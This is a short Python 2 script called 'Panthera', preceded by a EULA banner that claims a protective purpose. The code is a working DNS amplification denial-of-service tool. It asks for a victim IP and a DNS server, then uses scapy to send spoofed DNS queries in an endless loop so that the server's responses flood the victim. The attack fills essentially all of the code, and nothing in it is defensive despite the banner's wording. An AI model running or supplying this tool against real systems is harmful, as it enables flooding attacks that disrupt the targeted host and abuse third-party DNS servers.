# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #
#!/usr/bin/python
import sys
import os
from scapy.all import *

cmd = "clear"
returned_value = os.system(cmd)
sys.stdout.write("\033[1;31m")
print "\n						Project: Panthera\n"
print "\n						Coder: Haroon Awan\n"
sys.stdout.write("\033[1;33m")
print "[ + ] Version: 		Open Source Edition 1.0a\n"
print "[ + ] Contact: 		mrharoonawan\@gmail\.com\n"
print "[ + ] Environment: 	Python under Kali Linux\n"
print "[ + ] Github: 		Https://www.github.com/haroonawanethicalhacker\n"
print "[ + ] Design Scheme: 	DDos using spoofed DNS to victim IP causing amplification \n"
print "[ + ] Usage: 		python DDOS_DNS_POC.py\n\n"

sys.stdout.write("\033[0;32m")
victimIP = raw_input("[ + ] Enter victim IP ... : ")
dnsIP = raw_input("[ + ] Enter source DNS  ... :  ")
print "[ + ] Sending spoofed source DNS requests via victim IP  ... :  "
print "[ + ] Contacting Target  ... :  "
while True:
        send(IP(dst=dnsIP,src=victimIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)
print('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
